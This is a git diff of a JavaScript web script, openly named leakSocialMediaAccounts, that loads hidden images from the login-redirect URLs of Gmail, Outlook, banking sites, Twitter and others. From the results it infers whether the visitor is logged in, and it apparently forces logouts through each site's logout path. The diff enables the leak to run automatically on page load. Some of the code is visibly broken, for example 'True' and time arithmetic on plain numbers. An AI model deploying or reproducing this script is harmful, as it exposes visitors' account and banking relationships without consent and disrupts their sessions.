@@ -1,66 +1,70 @@
-var platforms = [{
-  domain: "https://accounts.google.com",
-  redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
-  name: "Gmail",
-  loggedIn: false,
-  logoutPath:"/logout"
-},{
-  domain: "https://accounts.google.com",
-  redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
-  name: "Youtube",
-  loggedIn : false,
-  logoutPath:"/logout"    	
-},{
-	domain: "https://outlook.live.com",
-	redirect: "/login.srf?wa=wsignin1.0&wreply=https%3A%2F%2Fprofile.microsoft.com%2FregsysProfilecenter%2FImages%2FLogin.jpg",
-	name: "Outlook",
-	loggedIn : true,
-	logoutPath:"/owa/logoff.owa"    	
-},{
-   domain: "https://www.khanacademy.org",
-   redirect: "/login?continue=%2Ffavicon.ico",
-   name: "KhanAcademy",
-   loggedIn : false,
-   logoutPath:"/logout?continue=/"
-   },
-   {
-   domain: "https://retail.onlinesbi.com",
-   redirect: "/retail/mypage.htm",
-   name: "SBI",
-   loggedIn : false,
-   logoutPath:"/retail/logout.htm"
-   },{
-  domain: "https://riders.uber.com",
-  redirect: "/login/?next_url=https://riders.uber.com/",
-   name: "Uber",
-   loggedIn : false,
-   logoutPath:"/logout"
-  }, {
-  domain: "https://secure.skype.com",
-  redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
-  name: "Skype",
-  loggedIn: false,
-  logoutPath:"/portal/logout"
-<<<<<<< HEAD
-  }, {
-  	domain: "https://www.iobnet.co.in",
-  	redirect: "",
-  	name: "IOB",
-  	loggedin: false,
-  	logoutPath: "/ibanking/logout.do"
-  }	
-=======
-},{
-  domain: "https://www.messenger.com",
-  redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fwww.messenger.com%2Ffavicon.ico",
-  name: "Messenger",
-  loggedIn: false,
-  logoutPath:"/logout"
-	}
->>>>>>> 2e176a5ca0158346ba6e77d208a10f6fa32c2fb0
+var platforms = [//{
+//   domain: "https://accounts.google.com",
+//   redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
+//   name: "Gmail",
+//   loggedIn: false,
+//   logoutPath:"/logout"
+// },{
+//   domain: "https://accounts.google.com",
+//   redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
+//   name: "Youtube",
+//   loggedIn : false,
+//   logoutPath:"/logout"    	
+// },{
+// 	domain: "https://outlook.live.com",
+// 	redirect: "/login.srf?wa=wsignin1.0&wreply=https%3A%2F%2Fprofile.microsoft.com%2FregsysProfilecenter%2FImages%2FLogin.jpg",
+// 	name: "Outlook",
+// 	loggedIn : true,
+// 	logoutPath:"/owa/logoff.owa"    	
+// },{
+//    domain: "https://www.khanacademy.org",
+//    redirect: "/login?continue=%2Ffavicon.ico",
+//    name: "KhanAcademy",
+//    loggedIn : false,
+//    logoutPath:"/logout?continue=/"
+//    },
+//    {
+//    domain: "https://retail.onlinesbi.com",
+//    redirect: "/retail/mypage.htm",
+//    name: "SBI",
+//    loggedIn : false,
+//    logoutPath:"/retail/logout.htm"
+//    },{
+//   domain: "https://riders.uber.com",
+//   redirect: "/login/?next_url=https://riders.uber.com/",
+//    name: "Uber",
+//    loggedIn : false,
+//    logoutPath:"/logout"
+//   }, {
+//   domain: "https://secure.skype.com",
+//   redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fsecure.skype.com%2Ffavicon.ico",
+//   name: "Skype",
+//   loggedIn: false,
+//   logoutPath:"/portal/logout"
+
+//   }, {
+//   	domain: "https://www.iobnet.co.in",
+//   	redirect: "",
+//   	name: "IOB",
+//   	loggedin: false,
+//   	logoutPath: "/ibanking/logout.do"
+//   },{
+//   domain: "https://www.messenger.com",
+//   redirect: "/login?message=signin_continue&redirect_uri=https%3A%2F%2Fwww.messenger.com%2Ffavicon.ico",
+//   name: "Messenger",
+//   loggedIn: false,
+//   logoutPath:"/logout"
+//   },
+                 {
+    domain: "https://twitter.com",
+    redirect: "/login?redirect_after_login=%2Ffavicon.ico",
+    name: "Twitter",
+    loggedIn: false,
+    logoutPath: "/logout"
+  }
 ];
 
-var lastLoggedInTime={}
+var lastLoggedInTime={};
 var refreshToken={};
 
 
@@ -72,7 +76,7 @@ var leakSocialMediaAccounts = function(callback) {
 	    img.src = network.domain + network.redirect;
 	    img.onload = function() {
 	      network.loggedIn=true;
-	      var now = new Date().getTime()            
+	      var now = new Date().getTime();
 	      lastLoggedInTime['google']=now;
 	      callback(network, true);
 	    };
@@ -100,7 +104,7 @@ function displayResult(network, loggedIn) {
   }
 }
 
-// leakSocialMediaAccounts(displayResult);
+ leakSocialMediaAccounts(displayResult);
 
 
 function faviconUri(network) {
@@ -136,12 +140,12 @@ function logOutUser(){
       
       img.onerror = function() {
       	if(network.loggedIn==True)
-      		{	var now = new Date().getTime()
-      			refreshToken[network] = lastLoggedInTime[network] - now;
-      			console.log(refreshToken['google'].getHours() + " Hours " + refreshToken['google'].getMinutes() + " Minutes " + refreshToken['google'].getSeconds() + " Seconds");
-      		}
-
-		console.log("Logging you out of " + network.name);          				            
+      	{	var now = new Date().getTime();
+      		refreshToken[network] = lastLoggedInTime[network] - now;
+      		console.log(refreshToken['google'].getHours() + " Hours " + refreshToken['google'].getMinutes() + " Minutes " + refreshToken['google'].getSeconds() + " Seconds");
+      	}
+        
+	console.log("Logging you out of " + network.name);          				            
       };
     
 
